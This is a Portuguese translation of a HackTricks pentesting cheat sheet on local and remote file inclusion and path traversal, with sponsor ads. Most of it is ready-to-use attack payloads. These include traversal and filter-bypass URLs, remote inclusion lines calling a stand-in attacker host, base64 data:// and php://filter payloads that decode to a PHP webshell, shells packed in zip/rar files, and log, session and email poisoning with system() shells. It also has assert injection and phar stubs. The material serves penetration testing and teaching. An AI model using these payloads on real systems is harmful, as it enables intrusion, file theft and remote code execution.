# Inclusão de Arquivo/Travessia de Caminho

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>

**HackenProof é o lar de todas as recompensas por bugs de criptografia.**

**Seja recompensado sem atrasos**\
As recompensas do HackenProof são lançadas apenas quando os clientes depositam o orçamento de recompensa. Você receberá a recompensa após a verificação do bug.

**Adquira experiência em pentesting web3**\
Protocolos de blockchain e contratos inteligentes são a nova Internet! Domine a segurança web3 em seus dias de ascensão.

**Torne-se uma lenda do hacker web3**\
Ganhe pontos de reputação com cada bug verificado e conquiste o topo do leaderboard semanal.

[**Cadastre-se no HackenProof**](https://hackenproof.com/register) comece a ganhar com seus hacks!

{% embed url="https://hackenproof.com/register" %}

## Inclusão de Arquivo

**Inclusão de Arquivo Remoto (RFI):** O arquivo é carregado de um servidor remoto (Melhor: você pode escrever o código e o servidor irá executá-lo). No php isso é **desativado** por padrão (**allow\_url\_include**).\
**Inclusão de Arquivo Local (LFI):** O servidor carrega um arquivo local.

A vulnerabilidade ocorre quando o usuário pode controlar de alguma forma o arquivo que será carregado pelo servidor.

Funções PHP vulneráveis: require, require\_once, include, include\_once

Uma ferramenta interessante para explorar essa vulnerabilidade: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Cegueira - Interessante - Arquivos LFI2RCE
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Misturando várias listas de LFI \*nix e adicionando mais caminhos, criei esta:**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

Tente também trocar `/` por `\`\
Tente também adicionar `../../../../../`

Uma lista que usa várias técnicas para encontrar o arquivo /etc/password (para verificar se a vulnerabilidade existe) pode ser encontrada [aqui](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Mesclando várias listas, criei esta:

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

Tente também trocar `/` por `\`\
Tente também remover `C:/` e adicionar `../../../../../`

Uma lista que usa várias técnicas para encontrar o arquivo /boot.ini (para verificar se a vulnerabilidade existe) pode ser encontrada [aqui](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Verifique a lista de LFI do Linux.

## LFI básico e bypasses

Todos os exemplos são para Inclusão de Arquivo Local, mas também podem ser aplicados à Inclusão de Arquivo Remoto (page=[http://meuserver.com/phpshellcode.txt\\](http://meuserver.com/phpshellcode.txt\)/).
```
http://example.com/index.php?page=../../../etc/passwd
```
### Sequências de travessia removidas de forma não recursiva

When performing a file inclusion vulnerability assessment, it is common to encounter web applications that implement input validation mechanisms to prevent directory traversal attacks. One common technique used to bypass these filters is to strip traversal sequences from the user input in a non-recursive manner.

Durante a realização de uma avaliação de vulnerabilidade de inclusão de arquivo, é comum encontrar aplicações web que implementam mecanismos de validação de entrada para evitar ataques de travessia de diretório. Uma técnica comum usada para contornar esses filtros é remover as sequências de travessia da entrada do usuário de forma não recursiva.

This technique involves repeatedly replacing traversal sequences such as "../" or "..\" with an empty string until no more occurrences are found. By doing so, the attacker can bypass the input validation and access files outside the intended directory.

Essa técnica envolve substituir repetidamente sequências de travessia, como "../" ou "..\", por uma string vazia até que não haja mais ocorrências. Ao fazer isso, o atacante pode contornar a validação de entrada e acessar arquivos fora do diretório pretendido.

It is important to note that this technique may not work in all cases, as some applications may implement more sophisticated input validation mechanisms. Additionally, it is crucial to ensure that the file inclusion vulnerability is present and that exploiting it is within the scope of the authorized penetration test.

É importante observar que essa técnica pode não funcionar em todos os casos, pois algumas aplicações podem implementar mecanismos de validação de entrada mais sofisticados. Além disso, é crucial garantir que a vulnerabilidade de inclusão de arquivo esteja presente e que explorá-la esteja dentro do escopo do teste de penetração autorizado.
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Byte nulo (%00)**

Bypass para adicionar mais caracteres ao final da string fornecida (bypass de: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Isso está **resolvido desde o PHP 5.4**

### **Codificação**

Você pode usar codificações não padrão, como codificação de URL dupla (e outras):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### A partir da pasta existente

Talvez o back-end esteja verificando o caminho da pasta:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Identificando pastas em um servidor

Dependendo do código aplicativo / caracteres permitidos, pode ser possível explorar recursivamente o sistema de arquivos descobrindo pastas e não apenas arquivos. Para fazer isso:

* identifique a "profundidade" do seu diretório atual ao recuperar com sucesso `/etc/passwd` (se estiver no Linux):
```
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
* tente adivinhar o nome de uma pasta no diretório atual adicionando o nome da pasta (aqui, `private`), e depois voltando para `/etc/passwd`:
```
http://example.com/index.php?page=private/../../../../etc/passwd # we went deeper down one level, so we have to go 3+1=4 levels up to go back to /etc/passwd
```
* se a aplicação for vulnerável, pode haver dois resultados diferentes para a solicitação:
* se você receber um erro / nenhuma saída, a pasta `private` não existe neste local
* se você receber o conteúdo de `/etc/passwd`, você validou que de fato existe uma pasta `private` no diretório atual
* as pastas que você descobriu usando essas técnicas podem então ser fuzzed para arquivos (usando um método clássico de LFI) ou para subdiretórios usando a mesma técnica recursivamente.

É possível adaptar essa técnica para encontrar diretórios em qualquer localização no sistema de arquivos. Por exemplo, se, sob a mesma hipótese (diretório atual com profundidade 3 no sistema de arquivos), você deseja verificar se `/var/www/` contém um diretório `private`, use a seguinte carga útil:
```
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
A seguinte sequência de comandos permite a geração de payloads usando `sed` (1) como entrada para ferramentas de fuzzing de URL, como `ffuf` (2):
```
$ sed 's_^_../../../var/www/_g' /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt | sed 's_$_/../../../etc/passwd_g' > payloads.txt
$ ffuf -u http://example.com/index.php?page=FUZZ -w payloads.txt -mr "root"
```
### **Truncamento de caminho**

Bypassa a adição de mais caracteres no final da string fornecida (bypass de: $\_GET\['param']."php")
```
In PHP: /etc/passwd = /etc//passwd = /etc/./passwd = /etc/passwd/ = /etc/passwd/.
Check if last 6 chars are passwd --> passwd/
Check if last 4 chars are ".php" --> shellcode.php/.
```

```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\[ADD MORE]\.\.
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.

#With the next options, by trial and error, you have to discover how many "../" are needed to delete the appended string but not "/etc/passwd" (near 2027)

http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
Sempre tente **iniciar** o caminho com um diretório falso (a/).

**Essa vulnerabilidade foi corrigida no PHP 5.3.**

### **Truques de bypass de filtro**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Inclusão Remota de Arquivos

No PHP, isso está desabilitado por padrão porque a configuração **`allow_url_include`** está definida como **Off**. Ela precisa estar como **On** para funcionar e, nesse caso, você poderia incluir um arquivo PHP do seu servidor e obter RCE (Execução Remota de Código):
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Se por algum motivo **`allow_url_include`** estiver **Ativado**, mas o PHP estiver **filtrando** o acesso a páginas da web externas, [conforme este post](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), você pode usar, por exemplo, o protocolo de dados com base64 para decodificar um código PHP em base64 e obter RCE:

{% code overflow="wrap" %}
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
{% endcode %}

{% hint style="info" %}
No código anterior, o `+.txt` final foi adicionado porque o atacante precisava de uma string que terminasse em `.txt`, então a string termina com isso e após a decodificação b64 essa parte retornará apenas lixo e o código PHP real será incluído (e, portanto, executado).
{% endhint %}

Outro exemplo **sem usar o protocolo `php://`** seria:

{% code overflow="wrap" %}
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
{% endcode %}

## Elemento Raiz do Python

Em python, em um código como este:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Se o usuário passar um **caminho absoluto** para **`file_name`**, o **caminho anterior é simplesmente removido**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
É o comportamento esperado de acordo com [a documentação](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Se um componente for um caminho absoluto, todos os componentes anteriores são descartados e a junção continua a partir do componente de caminho absoluto.

## Listar Diretórios em Java

Parece que se você tiver uma Traversal de Caminho em Java e **solicitar um diretório** em vez de um arquivo, será retornada uma **lista do diretório**. Isso não acontecerá em outras linguagens (pelo que eu saiba).

## Top 25 parâmetros

Aqui está uma lista dos 25 principais parâmetros que podem ser vulneráveis a vulnerabilidades de inclusão de arquivo local (LFI) (de [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI usando wrappers e protocolos PHP

### php://filter

Os filtros do PHP permitem realizar operações básicas de **modificação nos dados** antes de serem lidos ou gravados. Existem 5 categorias de filtros:

* [Filtros de String](https://www.php.net/manual/en/filters.string.php):
* `string.rot13`
* `string.toupper`
* `string.tolower`
* `string.strip_tags`: Remove as tags dos dados (tudo entre os caracteres "<" e ">")
* Note que este filtro desapareceu das versões modernas do PHP
* [Filtros de Conversão](https://www.php.net/manual/en/filters.convert.php)
* `convert.base64-encode`
* `convert.base64-decode`
* `convert.quoted-printable-encode`
* `convert.quoted-printable-decode`
* `convert.iconv.*` : Transforma para uma codificação diferente (`convert.iconv.<input_enc>.<output_enc>`). Para obter a **lista de todas as codificações** suportadas, execute no console: `iconv -l`

{% hint style="warning" %}
Abusando do filtro de conversão `convert.iconv.*`, você pode **gerar texto arbitrário**, o que pode ser útil para escrever texto arbitrário ou fazer com que uma função como include processe texto arbitrário. Para mais informações, consulte [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).
{% endhint %}

* [Filtros de Compressão](https://www.php.net/manual/en/filters.compression.php)
* `zlib.deflate`: Comprime o conteúdo (útil se estiver extraindo muitas informações)
* `zlib.inflate`: Descomprime os dados
* [Filtros de Criptografia](https://www.php.net/manual/en/filters.encryption.php)
* `mcrypt.*` : Descontinuado
* `mdecrypt.*` : Descontinuado
* Outros Filtros
* Executando `var_dump(stream_get_filters());` no PHP, você pode encontrar alguns **filtros inesperados**:
* `consumed`
* `dechunk`: reverte a codificação chunked do HTTP
* `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
{% hint style="warning" %}
A parte "php://filter" é case insensitive
{% endhint %}

### php://fd

Este wrapper permite acessar descritores de arquivo que o processo tem aberto. Potencialmente útil para exfiltrar o conteúdo de arquivos abertos:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Você também pode usar **php://stdin, php://stdout e php://stderr** para acessar os **descritores de arquivo 0, 1 e 2**, respectivamente (não tenho certeza de como isso poderia ser útil em um ataque)

### zip:// e rar://

Faça o upload de um arquivo Zip ou Rar com um PHPShell dentro e acesse-o.\
Para poder abusar do protocolo rar, **é necessário ativá-lo especificamente**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://

A data:// é uma técnica de inclusão de arquivo que explora a capacidade de um aplicativo web de ler dados de um URI (Uniform Resource Identifier). O URI começa com o esquema "data://" e contém os dados que serão lidos pelo aplicativo.

Essa técnica pode ser explorada para incluir arquivos arbitrários no aplicativo web, permitindo que um invasor acesse informações confidenciais ou execute código malicioso. O invasor pode fornecer um URI que contenha um arquivo malicioso, como um script PHP, e o aplicativo web irá interpretá-lo como parte do código legítimo.

Para evitar a exploração da técnica de inclusão de arquivo data://, é importante validar e filtrar cuidadosamente os URIs fornecidos pelos usuários antes de usá-los para ler dados. Além disso, é recomendável manter o aplicativo web atualizado com as últimas correções de segurança para evitar vulnerabilidades conhecidas que possam ser exploradas.
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Fato interessante: você pode acionar um XSS e contornar o Auditor do Chrome com: `http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+`

Observe que esse protocolo é restrito pelas configurações do PHP **`allow_url_open`** e **`allow_url_include`**

### expect://

O Expect deve ser ativado. Você pode executar código usando isso.
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Especifique sua carga útil nos parâmetros POST
```
http://example.com/index.php?page=php://input
POST DATA: <?php system('id'); ?>
```
### phar://

Um arquivo `.phar` também pode ser usado para executar código PHP se o site estiver usando alguma função como `include` para carregar o arquivo.

{% code title="create_phar.php" %}
```python
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');

$phar->stopBuffering();
```
{% endcode %}

E você pode compilar o `phar` executando a seguinte linha:
```bash
php --define phar.readonly=0 create_path.php
```
Será gerado um arquivo chamado `test.phar` que você pode usar para abusar do LFI.

Se o LFI estiver apenas lendo o arquivo e não executando o código PHP dentro dele, por exemplo, usando funções como _**file\_get\_contents(), fopen(), file() ou file\_exists(), md5\_file(), filemtime() ou filesize()**_**. Você pode tentar abusar de uma **desserialização** que ocorre ao **ler** um **arquivo** usando o protocolo **phar**.\
Para mais informações, leia o seguinte post:

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### Mais protocolos

Verifique mais possíveis [**protocolos para incluir aqui**](https://www.php.net/manual/en/wrappers.php)**:**

* [php://memory e php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Escrever na memória ou em um arquivo temporário (não tenho certeza de como isso pode ser útil em um ataque de inclusão de arquivo)
* [file://](https://www.php.net/manual/en/wrappers.file.php) — Acessar o sistema de arquivos local
* [http://](https://www.php.net/manual/en/wrappers.http.php) — Acessar URLs HTTP(s)
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Acessar URLs FTP(s)
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Fluxos de compressão
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Encontrar nomes de caminho que correspondam ao padrão (não retorna nada imprimível, então não é realmente útil aqui)
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Fluxos de áudio (não útil para ler arquivos arbitrários)

## LFI via 'assert' do PHP

Se você encontrar um LFI difícil que parece estar filtrando strings de travessia como ".." e respondendo com algo como "Tentativa de invasão" ou "Boa tentativa!", uma carga útil de injeção 'assert' pode funcionar.

Uma carga útil como esta:
```
' and die(show_source('/etc/passwd')) or '
```
irá explorar com sucesso o código PHP para um parâmetro "file" que se parece com isso:
```bash
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
```
Também é possível obter RCE em uma declaração "assert" vulnerável usando a função system():
```
' and die(system("whoami")) or '
```
Certifique-se de codificar as cargas úteis em URL antes de enviá-las.

<figure><img src="../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>

**HackenProof é o lar de todas as recompensas por bugs de criptografia.**

**Seja recompensado sem atrasos**\
As recompensas do HackenProof são lançadas apenas quando seus clientes depositam o orçamento de recompensa. Você receberá a recompensa após a verificação do bug.

**Adquira experiência em pentesting web3**\
Protocolos de blockchain e contratos inteligentes são a nova Internet! Domine a segurança web3 em seus dias de ascensão.

**Torne-se a lenda dos hackers web3**\
Ganhe pontos de reputação com cada bug verificado e conquiste o topo do leaderboard semanal.

[**Cadastre-se no HackenProof**](https://hackenproof.com/register) e comece a ganhar com seus hacks!

{% embed url="https://hackenproof.com/register" %}

## Traversal de Caminho Cego em PHP

{% hint style="warning" %}
Essa técnica é relevante em casos em que você **controla** o **caminho do arquivo** de uma **função PHP** que irá **acessar um arquivo**, mas você não verá o conteúdo do arquivo (como uma chamada simples para **`file()`**), mas o conteúdo não é mostrado.
{% endhint %}

Neste [**post incrível**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html), é explicado como uma traversal de caminho cego pode ser abusada por meio do filtro PHP para **extrair o conteúdo de um arquivo por meio de um oráculo de erro**.

Em resumo, a técnica usa a codificação **"UCS-4LE"** para tornar o conteúdo de um arquivo tão **grande** que a **função PHP de abertura** do arquivo irá disparar um **erro**.

Em seguida, para vazar o primeiro caractere, o filtro **`dechunk`** é usado junto com outros, como **base64** ou **rot13**, e finalmente os filtros **convert.iconv.UCS-4.UCS-4LE** e **convert.iconv.UTF16.UTF-16BE** são usados para **colocar outros caracteres no início e vazá-los**.

**Funções que podem ser vulneráveis**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (somente alvo somente leitura com isso)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Para obter detalhes técnicos, consulte o post mencionado!

## LFI2RCE

### Inclusão Remota de Arquivos

Explicado anteriormente, [**siga este link**](./#remote-file-inclusion).

### Por meio do arquivo de log do Apache/Nginx

Se o servidor Apache ou Nginx for **vulnerável a LFI** dentro da função de inclusão, você pode tentar acessar **`/var/log/apache2/access.log` ou `/var/log/nginx/access.log`**, definir dentro do **agente do usuário** ou dentro de um **parâmetro GET** um shell php como **`<?php system($_GET['c']); ?>`** e incluir esse arquivo

{% hint style="warning" %}
Observe que, **se você usar aspas duplas** para o shell em vez de **aspas simples**, as aspas duplas serão modificadas para a string "_**quote;**_", **o PHP lançará um erro** lá e **nada mais será executado**.

Além disso, certifique-se de **escrever corretamente a carga útil** ou o PHP gerará um erro sempre que tentar carregar o arquivo de log e você não terá uma segunda oportunidade.
{% endhint %}

Isso também pode ser feito em outros logs, mas **tenha cuidado**, o código dentro dos logs pode estar codificado em URL e isso pode destruir o Shell. O cabeçalho **authorisation "basic"** contém "user:password" em Base64 e é decodificado nos logs. O PHPShell pode ser inserido dentro desse cabeçalho.\
Outros possíveis caminhos de log:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Lista de palavras para fuzzing: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Via Email

**Envie um email** para uma conta interna (user@localhost) contendo seu payload PHP como `<?php echo system($_REQUEST["cmd"]); ?>` e tente incluir o email do usuário com um caminho como **`/var/mail/<NOME_DE_USUÁRIO>`** ou **`/var/spool/mail/<NOME_DE_USUÁRIO>`**

### Via /proc/\*/fd/\*

1. Faça o upload de muitos shells (por exemplo: 100)
2. Inclua [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), com $PID = PID do processo (pode ser forçado por brute force) e $FD o descritor de arquivo (também pode ser forçado por brute force)

### Via /proc/self/environ

Como um arquivo de log, envie o payload no User-Agent, ele será refletido dentro do arquivo /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Via upload

Se você pode fazer o upload de um arquivo, basta injetar a carga útil do shell nele (por exemplo: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Para manter o arquivo legível, é melhor injetar nos metadados das imagens/doc/pdf.

### Através do upload de arquivo ZIP

Faça o upload de um arquivo ZIP contendo um shell PHP comprimido e acesse:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Via sessões PHP

Verifique se o site utiliza sessões PHP (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
Em PHP, essas sessões são armazenadas em arquivos _/var/lib/php5/sess\\_\[PHPSESSID]\_.
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Defina o cookie como `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
# Inclusão de Arquivo Local (LFI) para incluir o arquivo de sessão PHP

A Inclusão de Arquivo Local (LFI) é uma técnica de hacking que permite a um invasor incluir arquivos arbitrários em um aplicativo da web. Neste caso, vamos explorar a LFI para incluir o arquivo de sessão PHP.

## Passo 1: Identificar a vulnerabilidade LFI

O primeiro passo é identificar se o aplicativo da web é vulnerável à LFI. Isso pode ser feito inserindo um caminho de arquivo arbitrário em um parâmetro de URL que espera um arquivo para inclusão. Por exemplo:

```
http://example.com/page.php?file=/etc/passwd
```

Se o conteúdo do arquivo `/etc/passwd` for exibido na página, isso indica uma vulnerabilidade LFI.

## Passo 2: Incluir o arquivo de sessão PHP

Uma vez identificada a vulnerabilidade LFI, podemos usar essa técnica para incluir o arquivo de sessão PHP. O arquivo de sessão PHP geralmente é armazenado em um local específico, como `/var/lib/php/sessions/`. Podemos tentar incluí-lo da seguinte maneira:

```
http://example.com/page.php?file=/var/lib/php/sessions/sess_<session_id>
```

Substitua `<session_id>` pelo ID da sessão PHP que você deseja incluir. Se a inclusão for bem-sucedida, o conteúdo do arquivo de sessão será exibido na página.

## Consequências da inclusão do arquivo de sessão PHP

Ao incluir o arquivo de sessão PHP, um invasor pode obter acesso às informações armazenadas na sessão, como credenciais de login, tokens de autenticação e outros dados sensíveis. Isso pode levar a ataques de sessão, comprometendo a segurança do aplicativo da web.

## Medidas de proteção

Para proteger seu aplicativo da web contra ataques de inclusão de arquivo local (LFI), siga estas práticas recomendadas:

- Valide e filtre cuidadosamente todos os dados de entrada, especialmente os parâmetros de URL.
- Restrinja o acesso aos diretórios e arquivos sensíveis.
- Utilize mecanismos de controle de acesso para limitar as permissões de leitura e gravação.
- Mantenha seu aplicativo e seus componentes atualizados com as últimas correções de segurança.

Ao implementar essas medidas de proteção, você pode reduzir significativamente o risco de um ataque de inclusão de arquivo local (LFI) bem-sucedido.
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Via ssh

Se o ssh estiver ativo, verifique qual usuário está sendo usado (/proc/self/status e /etc/passwd) e tente acessar **\<HOME>/.ssh/id\_rsa**

### **Via** **logs do vsftpd**

Os logs deste servidor FTP são armazenados em _**/var/log/vsftpd.log**_. Se você tiver um LFI e puder acessar um servidor vsftpd exposto, você pode tentar fazer login definindo o payload PHP no nome de usuário e, em seguida, acessar os logs usando o LFI.

### Via filtro php base64 (usando base64)

Conforme mostrado neste [artigo](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64), o filtro base64 do PHP simplesmente ignora o que não é base64. Você pode usar isso para contornar a verificação da extensão do arquivo: se você fornecer base64 que termina com ".php", ele simplesmente ignorará o "." e adicionará "php" ao base64. Aqui está um exemplo de payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Através de filtros php (sem necessidade de arquivo)

Este [**artigo**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) explica que você pode usar **filtros php para gerar conteúdo arbitrário** como saída. O que basicamente significa que você pode **gerar código php arbitrário** para a inclusão **sem precisar escrevê-lo** em um arquivo.

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### Através de falha de segmentação

**Faça upload** de um arquivo que será armazenado como **temporário** em `/tmp`, então na **mesma requisição**, provoque uma **falha de segmentação**, e então o **arquivo temporário não será excluído** e você pode procurá-lo.

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### Através do armazenamento de arquivos temporários do Nginx

Se você encontrou uma **Inclusão Local de Arquivos** e o **Nginx** está sendo executado na frente do PHP, você pode ser capaz de obter RCE com a seguinte técnica:

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
